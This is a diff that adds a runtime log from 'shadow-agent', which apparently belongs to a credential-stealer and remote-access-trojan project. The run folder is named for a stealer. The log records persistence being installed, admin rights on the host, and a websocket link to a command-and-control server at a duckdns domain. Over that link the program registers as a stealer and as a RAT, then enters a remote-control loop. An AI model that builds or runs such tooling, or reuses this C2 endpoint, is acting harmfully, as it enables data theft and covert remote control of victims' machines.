@@ -1,0 +1,19 @@
+
+========== shadow-agent 3.1.9 run unix_1790521301 pid=15940 ========
+args=["F:\\wifi work\\стилак\\stealerfull\\shadow-agent.exe", "--watchdog"]
+
+[unix_1790521301] log_file=F:\wifi work\стилак\stealerfull\shadow_agent_run.log
+[unix_1790521301] mode=watchdog
+[unix_1790521302] persist install done
+[unix_1790521303] device id=ea583635-a176-441f-9064-5b6d1f939d0f host=DESKTOP-MQQKSD1 admin=true
+[unix_1790521303] ws_main_loop start url=wss://hiddenpaths.duckdns.org/ws/collect
+[unix_1790521303] network: c2 reachable hiddenpaths.duckdns.org:443 after 0 probes
+[unix_1790521303] ws connect attempt backoff=5s
+[unix_1790521303] ws: tcp+tls ok
+[unix_1790521303] ws: stealer_register sent
+[unix_1790521304] ws: first msg {"type":"stealer_ack","device_id":"ea583635-a176-441f-9064-5b6d1f939d0f","ok":true}
+[unix_1790521304] ws: stealer_ack_ok=true
+[unix_1790521304] ws: rat_register sent
+[unix_1790521304] ws: entering rat_loop (online)
+[unix_1790521315] ws: rat_loop ended (disconnect)
+[unix_1790521315] ws connect attempt backoff=5s
